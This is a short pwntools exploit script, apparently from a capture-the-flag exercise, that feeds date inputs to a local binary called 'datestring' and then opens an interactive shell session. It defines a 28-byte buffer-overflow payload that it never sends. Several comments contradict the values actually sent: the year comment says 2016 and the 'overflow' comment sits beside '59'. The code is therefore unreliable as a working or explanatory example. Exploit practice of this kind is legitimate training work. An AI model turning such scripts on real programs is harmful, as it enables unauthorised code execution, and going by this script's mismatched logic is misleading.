from pwn import *

# Start the process
p = process("./datestring")  # Replace with the actual binary path

# Craft the payload
# Fill the 28-byte buffer and overwrite v17 with 1
payload = b'A' * 28 + p32(1)  # Buffer overflow to set v17 to 1

# Run the exploit
p.sendlineafter(b"Year: ", b"2147483647214748364721474836472147483647214748364721474836472147483647")     # Input the year (2016) as bytes
p.sendlineafter(b"Month: ", b"12")      # Input the month (December) as bytes
p.sendlineafter(b"Day: ", b"25")        # Input the day (25th) as bytes
p.sendlineafter(b"Hour: ", b"0")       # Input any valid hour (12) as bytes
p.sendlineafter(b"Minute: ", b"0")      # Input any valid minute (0) as bytes
p.sendlineafter(b"Second: ", b"59")   # Overflow the buffer in the second input

# Interact with the shell
p.interactive()
